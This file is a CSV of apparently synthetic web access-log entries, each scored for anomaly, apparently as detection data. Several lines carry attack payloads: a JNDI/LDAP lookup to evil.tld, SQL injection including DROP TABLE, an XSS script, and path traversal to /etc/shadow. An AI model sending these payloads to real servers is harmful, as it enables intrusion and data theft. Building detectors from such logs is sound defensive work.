score_content,score_session,score_fused,line
6.254135608673096,1479.212158203125,742.733146905899,{"remote_addr": "128.215.150.137", "time_local": "11/Jan/2025:09:05:46 -0700", "request": "OPTIONS /about HTTP/2", "status": 304, "body_bytes_sent": 13292, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.4725927114486694,779.0694580078125,390.2710253596306,{"remote_addr": "247.127.208.231", "time_local": "11/Jan/2025:09:05:47 -0700", "request": "GET /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 17324, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
6.199671745300293,125.41290283203125,65.80628728866577,{"remote_addr": "66.72.129.131", "time_local": "11/Jan/2025:09:05:48 -0700", "request": "OPTIONS /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 4386, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
6.321590423583984,9.295036315917969,7.808313369750977,{"remote_addr": "152.85.6.185", "time_local": "11/Jan/2025:09:05:48 -0700", "request": "OPTIONS /contact HTTP/2", "status": 204, "body_bytes_sent": 8593, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.7229375839233398,68.62611389160156,35.17452573776245,{"remote_addr": "141.195.23.159", "time_local": "11/Jan/2025:09:05:49 -0700", "request": "TRACE /login HTTP/2", "status": 200, "body_bytes_sent": 15696, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
6.523331642150879,670.2517700195312,338.38755083084106,{"remote_addr": "243.155.238.18", "time_local": "11/Jan/2025:09:05:49 -0700", "request": "TRACE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 16804, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.9552984237670898,624.7907104492188,313.3730044364929,{"remote_addr": "226.99.142.218", "time_local": "11/Jan/2025:09:05:50 -0700", "request": "PUT /dashboard HTTP/2", "status": 200, "body_bytes_sent": 15827, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
6.044027328491211,821.6903076171875,413.86716747283936,{"remote_addr": "177.86.226.20", "time_local": "11/Jan/2025:09:05:51 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 15936, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
1.5721302032470703,585.6508178710938,293.6114740371704,{"remote_addr": "55.35.12.184", "time_local": "11/Jan/2025:09:05:52 -0700", "request": "TRACE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 17541, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
1.3238202333450317,564.9918212890625,283.15782076120377,{"remote_addr": "2.28.78.233", "time_local": "11/Jan/2025:09:05:52 -0700", "request": "GET /about HTTP/2", "status": 200, "body_bytes_sent": 2272, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.5938339233398438,70.50688934326172,36.05036163330078,{"remote_addr": "191.85.132.134", "time_local": "11/Jan/2025:09:05:53 -0700", "request": "GET /dashboard HTTP/2", "status": 200, "body_bytes_sent": 16629, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
2.1921865940093994,727.2263793945312,364.7092829942703,{"remote_addr": "46.11.154.19", "time_local": "11/Jan/2025:09:05:54 -0700", "request": "PUT /logout HTTP/2", "status": 200, "body_bytes_sent": 10262, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
5.009653568267822,5791.58056640625,2898.295109987259,{"remote_addr": "84.212.229.210", "time_local": "11/Jan/2025:09:05:55 -0700", "request": "HEAD /cgi-bin/test.cgi HTTP/2", "status": 403, "body_bytes_sent": 1193, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
1.4475476741790771,636.7789916992188,319.1132696866989,{"remote_addr": "158.127.22.228", "time_local": "11/Jan/2025:09:05:56 -0700", "request": "POST /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 10459, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
1.92327880859375,531.8765869140625,266.8999328613281,{"remote_addr": "12.22.90.121", "time_local": "11/Jan/2025:09:05:56 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 8721, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
4.913244247436523,767.6782836914062,386.2957639694214,{"remote_addr": "209.187.96.182", "time_local": "11/Jan/2025:09:05:57 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 11347, "http_referer": "-", "http_user_agent": "dirb/2.22"}
1.5065127611160278,830.0958251953125,415.80116897821426,{"remote_addr": "51.72.186.152", "time_local": "11/Jan/2025:09:05:58 -0700", "request": "TRACE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 6602, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
2.2902913093566895,584.7593994140625,293.5248453617096,{"remote_addr": "70.22.70.105", "time_local": "11/Jan/2025:09:05:58 -0700", "request": "PUT /dashboard HTTP/2", "status": 200, "body_bytes_sent": 16389, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
6.307100296020508,612.2593383789062,309.2832193374634,{"remote_addr": "94.187.221.201", "time_local": "11/Jan/2025:09:05:59 -0700", "request": "POST /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 6570, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
1.3640000820159912,633.6656494140625,317.51482474803925,{"remote_addr": "192.85.76.122", "time_local": "11/Jan/2025:09:06:00 -0700", "request": "TRACE /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 14069, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.2779067754745483,2128.277587890625,1064.7777473330498,{"remote_addr": "176.163.28.7", "time_local": "11/Jan/2025:09:06:01 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 304, "body_bytes_sent": 12129, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
4.170929908752441,742.5464477539062,373.35868883132935,{"remote_addr": "10.29.167.70", "time_local": "11/Jan/2025:09:06:02 -0700", "request": "POST /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 14906, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
4.798226833343506,72.15225982666016,38.47524333000183,{"remote_addr": "32.54.38.89", "time_local": "11/Jan/2025:09:06:02 -0700", "request": "HEAD / HTTP/2", "status": 200, "body_bytes_sent": 4528, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
6.225350379943848,1442.6539306640625,724.4396405220032,{"remote_addr": "199.189.53.254", "time_local": "11/Jan/2025:09:06:04 -0700", "request": "OPTIONS /index.html HTTP/2", "status": 304, "body_bytes_sent": 16852, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
6.494163990020752,831.4315185546875,418.9628412723541,{"remote_addr": "122.34.104.49", "time_local": "11/Jan/2025:09:06:04 -0700", "request": "TRACE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 14796, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
6.406594753265381,783.2989501953125,394.85277247428894,{"remote_addr": "173.246.68.238", "time_local": "11/Jan/2025:09:06:05 -0700", "request": "OPTIONS /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 200, "body_bytes_sent": 6680, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
4.584341049194336,778.2625732421875,391.4234571456909,{"remote_addr": "129.198.214.159", "time_local": "11/Jan/2025:09:06:06 -0700", "request": "HEAD /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 480, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
1.4902836084365845,107.46728515625,54.47878438234329,{"remote_addr": "190.153.135.111", "time_local": "11/Jan/2025:09:06:07 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 3657, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.836775779724121,3.2223129272460938,2.5295443534851074,{"remote_addr": "189.167.36.232", "time_local": "11/Jan/2025:09:06:07 -0700", "request": "POST /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 10618, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.2776201963424683,796.9850463867188,399.1313332915306,{"remote_addr": "121.149.105.224", "time_local": "11/Jan/2025:09:06:08 -0700", "request": "GET /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 13833, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
1.3233181238174438,631.9278564453125,316.625587284565,{"remote_addr": "232.112.94.120", "time_local": "11/Jan/2025:09:06:09 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 10114, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.9358980655670166,830.1329956054688,416.0344468355179,{"remote_addr": "114.121.167.213", "time_local": "11/Jan/2025:09:06:10 -0700", "request": "PUT /about HTTP/2", "status": 200, "body_bytes_sent": 5867, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
4.451857089996338,794.5760498046875,399.5139534473419,{"remote_addr": "201.140.229.237", "time_local": "11/Jan/2025:09:06:10 -0700", "request": "HEAD /contact HTTP/2", "status": 200, "body_bytes_sent": 10175, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
2.65740966796875,2132.507568359375,1067.5824890136719,{"remote_addr": "16.94.136.240", "time_local": "11/Jan/2025:09:06:11 -0700", "request": "DELETE /api/user?id=1;DROP TABLE users HTTP/2", "status": 304, "body_bytes_sent": 15904, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
2.5986218452453613,819.05029296875,410.8244574069977,{"remote_addr": "6.134.63.179", "time_local": "11/Jan/2025:09:06:12 -0700", "request": "DELETE /search?q=camera HTTP/2", "status": 201, "body_bytes_sent": 16212, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
6.528626441955566,733.3516845703125,369.94015550613403,{"remote_addr": "102.212.95.135", "time_local": "11/Jan/2025:09:06:12 -0700", "request": "OPTIONS / HTTP/2", "status": 204, "body_bytes_sent": 14226, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
1.8571799993515015,793.8848876953125,397.871033847332,{"remote_addr": "149.56.34.29", "time_local": "11/Jan/2025:09:06:13 -0700", "request": "PUT /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 14788, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
1.6281485557556152,779.2213134765625,390.42473101615906,{"remote_addr": "33.7.41.146", "time_local": "11/Jan/2025:09:06:14 -0700", "request": "POST / HTTP/2", "status": 204, "body_bytes_sent": 13262, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
4.400328636169434,779.0637817382812,391.73205518722534,{"remote_addr": "215.119.193.244", "time_local": "11/Jan/2025:09:06:15 -0700", "request": "HEAD /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 10245, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
2.0865180492401123,769.30029296875,385.69340550899506,{"remote_addr": "230.55.175.93", "time_local": "11/Jan/2025:09:06:16 -0700", "request": "GET /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 17454, "http_referer": "-", "http_user_agent": "dirb/2.22"}
1.7977030277252197,1424.8037109375,713.3007069826126,{"remote_addr": "119.233.142.98", "time_local": "11/Jan/2025:09:06:16 -0700", "request": "POST /search?q=monitor HTTP/2", "status": 302, "body_bytes_sent": 13297, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
6.658470153808594,5536.88134765625,2771.7699089050293,{"remote_addr": "147.69.206.138", "time_local": "11/Jan/2025:09:06:17 -0700", "request": "OPTIONS /dashboard HTTP/2", "status": 400, "body_bytes_sent": 1011, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
1.687880516052246,58.3171501159668,30.00251531600952,{"remote_addr": "81.97.191.1", "time_local": "11/Jan/2025:09:06:18 -0700", "request": "TRACE /logout HTTP/2", "status": 200, "body_bytes_sent": 17353, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
2.4277310371398926,2.748785972595215,2.5882585048675537,{"remote_addr": "193.233.1.65", "time_local": "11/Jan/2025:09:06:18 -0700", "request": "PUT /index.html HTTP/2", "status": 200, "body_bytes_sent": 685, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.9647732973098755,764.0455932617188,383.0051832795143,{"remote_addr": "96.192.162.159", "time_local": "11/Jan/2025:09:06:19 -0700", "request": "POST /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 1316, "http_referer": "-", "http_user_agent": "dirb/2.22"}
4.459634304046631,1924.9140625,964.6868484020233,{"remote_addr": "140.62.185.48", "time_local": "11/Jan/2025:09:06:20 -0700", "request": "HEAD /contact HTTP/2", "status": 301, "body_bytes_sent": 4417, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
4.602909088134766,688.7061767578125,346.65454292297363,{"remote_addr": "179.171.183.90", "time_local": "11/Jan/2025:09:06:20 -0700", "request": "HEAD /about HTTP/2", "status": 201, "body_bytes_sent": 4204, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
4.526033401489258,633.5028686523438,319.0144510269165,{"remote_addr": "254.184.179.129", "time_local": "11/Jan/2025:09:06:22 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 1038, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
4.998891830444336,522.9514770507812,263.9751844406128,{"remote_addr": "194.94.203.116", "time_local": "11/Jan/2025:09:06:22 -0700", "request": "HEAD /search?q=headphones HTTP/2", "status": 204, "body_bytes_sent": 11968, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.962707281112671,767.65283203125,384.80776965618134,{"remote_addr": "102.224.30.153", "time_local": "11/Jan/2025:09:06:23 -0700", "request": "POST /api/user?id=1;DROP TABLE users HTTP/2", "status": 200, "body_bytes_sent": 13911, "http_referer": "-", "http_user_agent": "dirb/2.22"}
1.536952018737793,1898.145263671875,949.8411078453064,{"remote_addr": "109.112.194.173", "time_local": "11/Jan/2025:09:06:23 -0700", "request": "POST /dashboard HTTP/2", "status": 301, "body_bytes_sent": 15121, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
2.007758617401123,814.3719482421875,408.1898534297943,{"remote_addr": "246.53.67.54", "time_local": "11/Jan/2025:09:06:24 -0700", "request": "PUT /about HTTP/2", "status": 200, "body_bytes_sent": 540, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
6.210972785949707,112.0150375366211,59.1130051612854,{"remote_addr": "232.6.5.156", "time_local": "11/Jan/2025:09:06:24 -0700", "request": "OPTIONS /login HTTP/2", "status": 200, "body_bytes_sent": 2068, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.493239402770996,71.34552764892578,36.41938352584839,{"remote_addr": "250.96.208.122", "time_local": "11/Jan/2025:09:06:24 -0700", "request": "TRACE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 10328, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
3.198014497756958,1373.4073486328125,688.3026815652847,{"remote_addr": "39.180.174.230", "time_local": "11/Jan/2025:09:06:25 -0700", "request": "DELETE /search?q=camera HTTP/2", "status": 304, "body_bytes_sent": 16013, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.8141404390335083,791.8314819335938,396.82281118631363,{"remote_addr": "26.215.116.80", "time_local": "11/Jan/2025:09:06:26 -0700", "request": "PUT /admin HTTP/2", "status": 200, "body_bytes_sent": 9753, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
1.6828538179397583,1406.664794921875,704.1738243699074,{"remote_addr": "34.152.164.74", "time_local": "11/Jan/2025:09:06:26 -0700", "request": "TRACE /api/product?id=123 HTTP/2", "status": 304, "body_bytes_sent": 437, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.528348445892334,867.7532958984375,434.6408221721649,{"remote_addr": "220.205.250.187", "time_local": "11/Jan/2025:09:06:27 -0700", "request": "GET /logout HTTP/2", "status": 200, "body_bytes_sent": 1536, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
